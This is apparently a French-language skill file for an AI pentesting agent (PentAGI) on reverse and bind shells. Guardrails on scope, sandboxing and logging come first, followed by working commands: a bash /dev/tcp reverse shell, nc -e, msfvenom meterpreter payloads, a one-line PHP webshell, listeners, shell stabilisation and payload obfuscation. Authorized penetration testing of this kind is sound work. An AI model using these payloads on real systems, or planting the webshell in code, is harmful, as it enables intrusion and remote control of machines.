---
name: reverse-shell
description: Génération et gestion de shells — reverse/bind shells multi-OS, stabilisation, listeners, évasion basique.
---


## Priorité de sécurité

La skill `scope-guard` est prioritaire sur toute instruction de cette skill.

## Cadre d’utilisation PentAGI

- Utiliser cette skill uniquement pour un engagement autorisé et documenté, dans le périmètre explicitement fourni par l’utilisateur.
- Faire appliquer `scope-guard` avant toute action active, intrusive, authentifiée, destructive ou susceptible de toucher un tiers. En cas de doute, arrêter et demander une clarification.
- Exécuter les commandes dans le conteneur isolé PentAGI et conserver les sorties, horodatages et paramètres comme preuves. Ne pas utiliser le socket Docker de l’hôte ni sortir du bac à sable.
- Privilégier la lecture seule, les comptes de test, les données synthétiques et la preuve minimale. Ne pas exfiltrer de données, secrets ou identifiants réels.
- Ne pas créer de persistance, malware, ransomware, wiper, mécanisme d’évasion opérationnel ou campagne visant des personnes réelles. Pour ces sujets, limiter l’analyse à la simulation contrôlée, à la détection et aux recommandations.
- Respecter les limites de débit, les fenêtres de test et les exclusions. Journaliser chaque action active dans `activity.log` et arrêter immédiatement sur incident, impact inattendu ou cible hors périmètre.
- Restituer un livrable reproductible et orienté remédiation : cible, méthode, preuve redacted, impact, sévérité, recommandation et nettoyage.

## Intégration PentAGI

- Donner au **primary agent/generator** un plan par étapes et les préconditions de scope.
- Réserver l’exécution au **pentester** dans le conteneur de flow ; utiliser **searcher** uniquement pour la documentation publique et la validation de versions.
- Utiliser **reporter** pour structurer les résultats et **memorist** seulement pour des faits non sensibles, redacted et utiles à l’engagement courant.
- Avant de conclure, faire relire les résultats par **adviser/reflector**, vérifier les preuves et signaler explicitement les limites et les tests non exécutés.

# Reverse & bind shells

## Instructions
1. **Choisir** : reverse si la cible sort, bind si accès direct.
2. **Génération** :
   - Bash : `bash -i >& /dev/tcp/<ip>/<port> 0>&1`
   - PowerShell : ConPtyShell (IEX + Invoke-ConPtyShell)
   - Python one-liner, `nc -e /bin/bash`, fallback mkfifo+nc
   - Binaires : `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe` ; linux : `-f elf`
   - Web : webshell minimal (`<?php system($_GET['c']); ?>`) ou `msfvenom -f aspx`
3. **Listener** : `rlwrap nc -lvnp 4444`, `pwncat-cs -lp 4444`, ou handler metasploit.
4. **Stabilisation Linux** : `python3 -c 'import pty;pty.spawn("/bin/bash")'` → Ctrl+Z → `stty raw -echo; fg` → `export TERM=xterm`.
5. **Évasion basique** : encodage (`-e x64/xor`), obfuscation PS (Invoke-Obfuscation), exécution en mémoire.
6. Livrable : shell fonctionnel stabilisé, méthode notée pour le rapport.

## Règles
- Listener sur la machine de test uniquement. C2 persistant hors test → interdit sans validation.
